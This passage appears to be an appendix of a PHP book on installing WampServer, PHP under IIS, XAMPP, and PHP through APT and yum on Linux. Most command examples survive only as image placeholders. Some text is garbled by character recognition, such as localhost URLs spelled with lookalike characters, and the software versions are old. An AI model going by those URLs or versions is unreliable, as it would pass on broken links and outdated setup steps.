![](image_rsrcNET.jpg)![](image_rsrcNEU.jpg)WampServer (64 BITS) 3 WampServer (32 BITS) 3

Providing currently:

![](image_rsrcNEV.jpg)Apache: 2.4.18

![](image_rsrcNEW.jpg)MySQL: 5.7.11

![](image_rsrcNEX.jpg)PHP: 5.6.19 & 7.0.4

Installation is simple, just execute the installer, choose the location and finish it.

Once that is done, you may start WampServer. Then it starts in the system tray (taskbar), initially red in color and then turns green once the server is up.

You may goto a browser and type localhost or 127.0.0.1 to get the index page of WAMP. You may work on PHP locally from now by storing the files in <PATH\_TO\_WAMP\>/www/<php\_or\_html\_file\> and check the result on [http://ﾕocaﾕhosł/    php\_or\_hłmﾕ\_fiﾕe\_name](http://ﾕocaﾕhosł/php_or_hłmﾕ_fiﾕe_name)\>

Section A.2: Install PHP and use it with IIS

First of all you need to have IIS (Internet Information Services) installed and running on your machine; IIS isn't available by default, you have to add the characteristic from Control Panel -> Programs -> Windows Characteristics.

1.  Download the PHP version you like from [http://windows.php.net/download/](http://windows.php.net/download/) and make sure you download the Non-Thread Safe (NTS) versions of PHP.

2.  Extract the files into C:\\PHP\\.

3.  Open the Internet Information Services Administrator IIS.

4.  Select the root item in the left panel.

5.  Double click on Handler Mappings.

6.  On the right side panel click on Add Module Mapping.

7.  Setup the values like this:

![](image_rsrcNEY.jpg)

8.  Install vcredist\_x64.exe or vcredist\_x86.exe (Visual C++ 2012 Redistributable) from

https://[www.microsoft.com/en-US/download/details.aspx?id=30679](http://www.microsoft.com/en-US/download/details.aspx?id=30679)

9.  Setup your C:\\PHP\\php.ini, especially set the extension\_dir \="C:\\PHP\\ext".

10.  Reset IIS: In a DOS command console type IISRESET.

Optionally you can install the PHP Manager for IIS which is of great help to setup the ini file and track the log of errors (doesn't work on Windows 10).

Remember to set index.php as one of the default documents for IIS. If you followed the installation guide now you are ready to test PHP.

Just like Linux, IIS has a directory structure on the server, the root of this tree is C:\\inetpub\\wwwroot\\, here is the point of entry for all your public files and PHP scripts.

Now use your favorite editor, or just Windows Notepad, and type the following:

![](image_rsrcNEZ.jpg)

Save the file under C:\\inetpub\\wwwroot\\index.php using the UTF-8 format (without BOM).

Then open your brand new website using your browser on this address: [http://localhost/index.php](http://localhost/index.php)

Section A.3: Download and Install XAMPP

What is XAMPP?

XAMPP is the most popular PHP development environment. XAMPP is a completely free, open-source and easy to install Apache distribution containing MariaDB, PHP, and Perl.

Where should I download it from?

Download appropriate stable XAMPP version from their download page. Choose the download based on the type of OS (32 or 64bit and OS version) and the PHP version it has to support.

Current latest being XAMPP for Windows 7.0.8 / PHP 7.0.8.

Or you can follow this:

XAMPP for Windows exists in three different flavors:

![](image_rsrcNF0.jpg)![](image_rsrcNF1.jpg)Installer (Probably .exe format the easiest way to install XAMPP) ZIP (For purists: XAMPP as ordinary ZIP .zip format archive)

![](image_rsrcNF2.jpg)7zip: (For purists with low bandwidth: XAMPP as 7zip .7zip format archive)

How to install and where should I place my PHP/html files? Install with the provided installer

1. Execute the XAMPP server installer by double clicking the downloaded .exe.

Install from the ZIP

1.  Unzip the zip archives into the folder of your choice.

2.  XAMPP is extracting to the subdirectory C:\\xampp 4be6l5ow the selected target directory.

3.  Now start the file setup\_xampp.bat, to adjust the XAMPP configuration to your system.

![](image_rsrcN5B.jpg)Note: If you choose a root directory C:\\ as target, you must not start setup\_xampp.bat.

Post-Install

Use the "XAMPP Control Panel" for additional tasks, like starting/stopping Apache, MySQL, FileZilla and Mercury or installing these as services.

File handling

The installation is a straight forward process and once the installation is complete you may add html/php files to be hosted on the server in XAMPP\-root/htdocs/. Then start the server and open [http://ﾕocaﾕhosł/fiﾕe.php](http://ﾕocaﾕhosł/fiﾕe.php) on a browser to view the page.

![](image_rsrcM38.jpg)Note: Default XAMPP root in Windows is C:/xampp/htdocs/

Type in one of the following URLs in your favourite web browser:

![](image_rsrcNF3.jpg)

Now you should see the XAMPP start page.

![](image_rsrcNF4.jpg)

Appendix B: Installing on Linux/Unix Environments

![](image_rsrcKMR.jpg)Section B.1: Command Line Install Using APT for PHP 7

This will only install PHP. If you wish to serve a PHP file to the web you will also need to install a web- server such as Apache, Nginx, or use PHP's built in web-server (php version 5.4+).

![](image_rsrcKNA.jpg)If you are in a Ubuntu version below 16.04 and want to use PHP 7 anyway, you can add Ondrej's PPA repository by doing: sudo add-apt-repository ppa:ondrej/php

Make sure that all of your repositories are up to date:

![](image_rsrcNF5.jpg)

After updating your system's repositories, install PHP:

![](image_rsrcNF6.jpg)

Let's test the installation by checking the PHP version:

![](image_rsrcNF7.jpg)

This should output something like this.

Note: Your output will be slightly different.

![](image_rsrcNF8.jpg)

You now have the capability to run PHP from the command line.

Section B.2: Installing in Enterprise Linux distributions (CentOS, Scientific Linux, etc)

Use the yum command to manage packages in Enterprise Linux-based operating systems:

![](image_rsrcNF9.jpg)

This installs a minimal install of PHP including some common features. If you need additional modules, you will need to install them separately. Once again, you can use yum to search for these packages:

![](image_rsrcNFA.jpg)

Example output:

![](image_rsrcNFB.jpg)

To install the gd library:

![](image_rsrcNFC.jpg)

Enterprise Linux distributions have always been conservative with updates, and typically do not update beyond the point release they shipped with. A number of third party repositories provide current versions of PHP:

![](image_rsrcNFD.jpg)IUS

![](image_rsrcNFE.jpg)![](image_rsrcNFF.jpg)Remi Colette Webtatic

IUS and Webtatic provide replacement packages with different names (e.g. php56u or php56w to install PHP 5.6) while Remi's repository provides in-place upgrades by using the same names as the system packages.

Following are instructions on installing PHP 7.0 from Remi's repository. This is the simplest example, as uninstalling the system packages is not required.

![](image_rsrcNFG.jpg)